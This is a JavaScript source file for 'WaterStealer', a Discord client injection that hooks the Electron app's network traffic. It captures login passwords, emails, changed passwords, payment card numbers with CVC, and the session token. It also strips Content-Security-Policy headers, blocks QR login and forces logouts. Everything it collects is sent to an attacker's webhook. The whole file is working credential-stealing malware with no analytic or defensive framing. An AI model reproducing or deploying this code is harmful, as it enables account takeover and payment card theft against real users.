const {
    BrowserWindow,
    session,
} = require('electron');
const os = require('os');
const https = require('https');
const querystring = require("querystring");
const fs = require("fs");

var config = {
    brand: "WaterStealer",

    webhook: "%WEBHOOK_LINK%",

    logout: true,
    disable_qr_code: true,

    notify_on_logout: false,
    notify_on_initialization: false,
    ping: [false, "@everyone"],

    embed: {
        username: "WaterStealer",
        footer: {
            text: `WaterStealer`,
            icon_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96",
        },
        href: "https://t.me/BestStealer",
        avatar_url: "https://cdn.discordapp.com/icons/1038524136839970966/c1f59fee8f2263be631d13420922089c.webp?size=96"
    },

    badges: {
        Discord_Employee: {
            Value: 1,
            Emoji: "Discord Employee",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "Partnered Server Owner",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "HypeSquad Events",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "Bug Hunter Level 1",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "Early Supporter",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "Bug Hunter Level 2",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "Early Verified Bot Developer",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "House Bravery",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "House Brilliance",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "House Balance",
            Rare: false,
        }
    },

    filters: {
        user: {
            urls: [
                "https://discord.com/api/v*/users/@me",
                "https://discordapp.com/api/v*/users/@me",
                "https://*.discord.com/api/v*/users/@me",
                "https://discordapp.com/api/v*/auth/login",
                'https://discord.com/api/v*/auth/login',
                'https://*.discord.com/api/v*/auth/login',
                "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
                "https://api.stripe.com/v*/tokens",
                "https://api.stripe.com/v*/setup_intents/*/confirm",
                "https://api.stripe.com/v*/payment_intents/*/confirm",
            ]
        },
        qr_codes: {
            urls: [
                "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
                "https://*.discord.com/api/v*/applications/detectable",
                "https://discord.com/api/v*/applications/detectable",
                "https://*.discord.com/api/v*/users/@me/library",
                "https://discord.com/api/v*/users/@me/library",
                "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
                "https://discord.com/api/v*/users/@me/billing/subscriptions",
                "wss://remote-auth-gateway.discord.gg/*"
            ]
        }
    }
}

var execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0]
    return window.webContents.executeJavaScript(script, true);
}

class Event {
    constructor(event, token, data) {
        for (let [key, value] of Object.entries({
                "event": event,
                "data": data,
                "token": token
            })) {
            this[key] = value;
        }
    }

    handle() {
        switch (this["event"]) {
            case "passwordChanged":
                event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
                break;
            case 'userLogin':
                event_handlers["userLogin"](this.data.password, this.data.email, this.token)
                break;
            case 'emailChanged':
                event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
                break;
            case "creditCardAdded":
                event_handlers["creditCardAdded"](this.data.number, this.data.cvc, this.data.exp_month, this.data.exp_year, this.token);
        }
    }
}

// Traffic recording (Pirate stealer inspiration)

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    try {
        if (details.url.startsWith(config.webhook)) {
            if (details.url.includes("discord.com")) {
                callback({
                    responseHeaders: Object.assign({
                        'Access-Control-Allow-Headers': "*"
                    }, details.responseHeaders)
                });
            } else {
                callback({
                    responseHeaders: Object.assign({
                        "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                        'Access-Control-Allow-Headers': "*",
                        "Access-Control-Allow-Origin": "*"
                    }, details.responseHeaders)
                });
            }
        } else {
            delete details.responseHeaders['content-security-policy'];
            delete details.responseHeaders['content-security-policy-report-only'];

            callback({
                responseHeaders: {
                    ...details.responseHeaders,
                    'Access-Control-Allow-Headers': "*"
                }
            })
        }

    } catch {}
})

session.defaultSession.webRequest.onBeforeRequest(config.filters["qr_codes"], async (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (!config.disable_qr_code == false) {
            callback({
                cancel: true
            })
            return;
        }
    }

    await initialize();

    callback({})
    return;
})

session.defaultSession.webRequest.onCompleted(config.filters["user"], async (details, callback) => {
    try {
        if (details.statusCode == 200 || details.statusCode == 204) {
            const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
            const data = JSON.parse(unparsed_data)
            const token = await getToken();

            switch (true) {
                case details.url.endsWith('login'):
                    (new Event('userLogin', token, {
                        password: data.password,
                        email: data.login
                    })).handle();;
                    return;
                case details.url.endsWith("tokens") && details.method == "POST":
                    const item = querystring.parse(unparsed_data.toString());
                    (new Event('creditCardAdded', token, {
                        number: item["card[number]"],
                        cvc: item["card[cvc]"],
                        exp_month: item["card[exp_month]"],
                        exp_year: item["card[exp_year]"],
                    }))

                case details.url.endsWith('users/@me') && details.method == 'PATCH':
                    if (!data.password) return;
                    if (data.email) {
                        (new Event('emailChanged', token, {
                            password: data.password,
                            email: data.email
                        })).handle();
                    };
                    if (data.new_password) {
                        (new Event('passwordChanged', token, {
                            password: data.password,
                            new_password: data.new_password
                        })).handle();
                    };
                    return;
                default:
                    break;
            }
        } else {
            return;
        }

    } catch {}
})

// ==================================================================================

var event_handlers = {

    async creditCardAdded(number, cvc, month, year) {
        const userInfo = await getUserInfo(token);
        const billing = await getBilling(token);
        const friends = await getRelationships(token);

        var params = {
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                title: "Credit card added",
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [
                    {
                        name: "🧨 Token:",
                        value: `\`${token}\``,
                        inline: false
                    },
                    {
                        name: "🎉 Badges:",
                        value: `\`${getBadges(userInfo.flags)}\``,
                        inline: true
                    },
                    {
                        name: "🎇 Nitro Type:",
                        value: `\`${getNitro(userInfo.premium_type)}\``,
                        inline: true
                    },
                    {
                        name: "💳 Billing:",
                        value: `\`${billing}\``,
                        inline: true
                    },
                    {
                        name: "💻 Email:",
                        value: `\`${email}\``,
                        inline: true
                    },
                    {
                        name: "💳 Credit card:",
                        value: `\`${number}|${month}|${year}|${cvc}\``,
                        inline: false
                    },
                ],
            }), createEmbed({
                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
            })]
        }

        sendToWebhook(params)
    },

    async userLogin(password, email, token) {
        const userInfo = await getUserInfo(token);
        const billing = await getBilling(token);
        const friends = await getRelationships(token);

        var params = {
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                title: "User logged in",
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: "🧨 Token:",
                        value: `\`${token}\``,
                        inline: false
                    },
                    {
                        name: "🎉 Badges:",
                        value: `\`${getBadges(userInfo.flags)}\``,
                        inline: true
                    },
                    {
                        name: "🎇 Nitro Type:",
                        value: `\`${getNitro(userInfo.premium_type)}\``,
                        inline: true
                    },
                    {
                        name: "💳 Billing:",
                        value: `\`${billing}\``,
                        inline: true
                    },
                    {
                        name: "💻 Email:",
                        value: `\`${email}\``,
                        inline: true
                    },
                    {
                        name: "🔑 Password:",
                        value: `\`${password}\``,
                        inline: true
                    },
                ],
            }), createEmbed({
                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
            })]
        }

        sendToWebhook(params)
    },

    async emailChanged(password, newEmail, token) {
        var userInfo = await getUserInfo(token);
        var billing = await getBilling(token);
        var friends = await getRelationships(token);

        var params = {
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                title: "Email changed",
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: "🧨 Token:",
                        value: `\`${token}\``,
                        inline: false
                    },
                    {
                        name: "🎉 Badges:",
                        value: `\`${getBadges(userInfo.flags)}\``,
                        inline: true
                    },
                    {
                        name: "🎇 Nitro Type:",
                        value: `\`${getNitro(userInfo.premium_type)}\``,
                        inline: true
                    },
                    {
                        name: "💳 Billing:",
                        value: `\`${billing}\``,
                        inline: true
                    },
                    {
                        name: "💻 Email:",
                        value: `\`${newEmail}\``,
                        inline: true
                    },
                    {
                        name: "🔑 Password:",
                        value: `\`${password}\``,
                        inline: true
                    },
                ],
            }), createEmbed({
                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
            })]
        }

        sendToWebhook(params)
    },

    async passwordChanged(oldPassword, newPassword, token) {
        var userInfo = await getUserInfo(token);
        var billing = await getBilling(token);
        var friends = await getRelationships(token);

        var params = {
            username: config.embed.username,
            avatar_url: config.embed.avatar_url,
            embeds: [createEmbed({
                title: "Password changed",
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                fields: [{
                        name: "🧨 Token:",
                        value: `\`${token}\``,
                        inline: false
                    },
                    {
                        name: "🎉 Badges:",
                        value: `\`${getBadges(userInfo.flags)}\``,
                        inline: true
                    },
                    {
                        name: "🎇 Nitro Type:",
                        value: `\`${getNitro(userInfo.premium_type)}\``,
                        inline: true
                    },
                    {
                        name: "💳 Billing:",
                        value: `\`${billing}\``,
                        inline: true
                    },
                    {
                        name: "💻 Email:",
                        value: `\`${newEmail}\``,
                        inline: true
                    },
                    {
                        name: "🔑 Old Password:",
                        value: `\`${oldPassword}\``,
                        inline: true
                    },
                    {
                        name: "🔑 New Password:",
                        value: `\`${newPassword}\``,
                        inline: false
                    },
                ],
            }), createEmbed({
                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
                thumbnail: {
                    url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
                author: {
                    name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                },
            })]
        }

        sendToWebhook(params)
    },
}

// ==================================================================================

function getDiscordClient() {
    return `${process.cwd().replace(`${process.env.LOCALAPPDATA}\\`, '').split('\\')[0].split(7)}`
}

// ==================================================================================

function getNitro(flags) {
    switch (flags) {
        case 0:
            return "\`No Nitro\`";
        case 1:
            return "Nitro classic";
        case 2:
            return "Nitro boost";
        default:
            return "\`No Nitro\`";

    };
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in config.badges) {
        let o = config.badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

function getBadges(flags) {
    var b = '';
    for (const prop in config.badges) {
        let o = config.badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') b = '\`None\`'
    return b;
}

async function getToken() {
    return await execScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
}

async function getUserInfo(token) {
    return JSON.parse(await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText;`, true));
}

async function getBilling(token) {
    var a = await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, true)
    var json = JSON.parse(a)

    var billing = "";
    json.forEach(z => {
        if (z.type == "") {
            return "\`❌\`";
        } else if (z.type == 2 && z.invalid != true) {
            billing += "<:paypal:1047566666197905478>";
        } else if (z.type == 1 && z.invalid != true) {
            billing += ":credit_card:";
        } else {
            return "\`❌\`";
        };
    });

    if (billing == "") billing = "\`❌\`"
    return billing;
}

async function getRelationships(token) {
    var a = await execScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${token}");xmlHttp.send( null );xmlHttp.responseText`, true)
    var json = JSON.parse(a)
    const r = json.filter((user) => {
        return user.type == 1
    })
    var rareBadgesFriends = "";
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
        }
    }
    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"

    return {
        length: r.length,
        frien: rareBadgesFriends
    }
}

// ==================================================================================

function sendToWebhook(params) {

    if (config.ping[0] == true) {
        if (params.content) {
            params.content = params.content + ` ||${config.ping[1]}||`
        } else {
            params.content = `||${config.ping[1]}||`
        }
    }

    var url = new URL(config.webhook);
    var headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
    }
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: 'POST',
        headers: headers,
    };
    const req = https.request(options);
    req.on('error', (err) => {
        console.log(err);
    });
    req.write(JSON.stringify(params));
    req.end();
}

// ==================================================================================

function createEmbed(data) {
    let obj = {
        "footer": config.embed.footer,
        "timestamp": new Date(),
    }

    for (let [key, value] of Object.entries(data)) {
        obj[key] = value;
    }

    return obj;
}

// ==================================================================================

async function initialize() {

    if (!fs.existsSync(`${process.cwd()}/${config.brand}`)) {
        fs.mkdirSync(`${process.cwd()}/${config.brand}`)

        var token = undefined;

        token = await getToken();

        const network_data = (await getIp())['ip'] || "127.0.0.1"

        var userInfo;
        var billing;
        var friends;

        if (config.notify_on_initialization) {
            if (token == undefined) {
                sendToWebhook({
                    username: config.embed.username,
                    avatar_url: config.embed.avatar_url,
                    embeds: [createEmbed({
                        title: "Client initialized (not logged in)",
                        fields: [{
                            name: "🧨 Token:",
                            value: `\`${token}\``,
                            inline: false
                        },
                        {
                            name: "🎉 Badges:",
                            value: `\`${getBadges(userInfo.flags)}\``,
                            inline: true
                        },
                        {
                            name: "🎇 Nitro Type:",
                            value: `\`${getNitro(userInfo.premium_type)}\``,
                            inline: true
                        },
                        {
                            name: "💳 Billing:",
                            value: `\`${billing}\``,
                            inline: true
                        },
                        {
                            name: "💻 Email:",
                            value: `\`${email}\``,
                            inline: true
                        }],
                    })]
                })
            } else {
                userInfo = await getUserInfo(token);
                billing = await getBilling(token);
                friends = await getRelationships(token);

                sendToWebhook({
                    username: config.embed.username,
                    avatar_url: config.embed.avatar_url,
                    embeds: [createEmbed({
                        title: "Injection Successfull",
                        author: {
                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        thumbnail: {
                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        fields: [{
                            name: "🧨 Token:",
                            value: `\`${token}\``,
                            inline: false
                        },
                        {
                            name: "🎉 Badges:",
                            value: `\`${getBadges(userInfo.flags)}\``,
                            inline: true
                        },
                        {
                            name: "🎇 Nitro Type:",
                            value: `\`${getNitro(userInfo.premium_type)}\``,
                            inline: true
                        },
                        {
                            name: "💳 Billing:",
                            value: `\`${billing}\``,
                            inline: true
                        },
                        {
                            name: "💻 Email:",
                            value: `\`${email}\``,
                            inline: true
                        }
                        ],
                    }), createEmbed({
                        description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
                        thumbnail: {
                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        author: {
                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                    })]
                })
            }

        }

        if (config.logout && token) {
            await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then((result) => {});

            if (config.notify_on_logout) {
                sendToWebhook({
                    username: config.embed.username,
                    avatar_url: config.embed.avatar_url,
                    embeds: [createEmbed({
                        title: "User logged out",
                        author: {
                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        thumbnail: {
                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        fields: [{
                            name: "🧨 Token:",
                            value: `\`${token}\``,
                            inline: false
                        },
                        {
                            name: "🎉 Badges:",
                            value: `\`${getBadges(userInfo.flags)}\``,
                            inline: true
                        },
                        {
                            name: "🎇 Nitro Type:",
                            value: `\`${getNitro(userInfo.premium_type)}\``,
                            inline: true
                        },
                        {
                            name: "💳 Billing:",
                            value: `\`${billing}\``,
                            inline: true
                        },
                        {
                            name: "💻 Email:",
                            value: `\`${email}\``,
                            inline: true
                        },]
                    })]
                })
            }

        }
    }
}

module.exports = require("./core.asar");
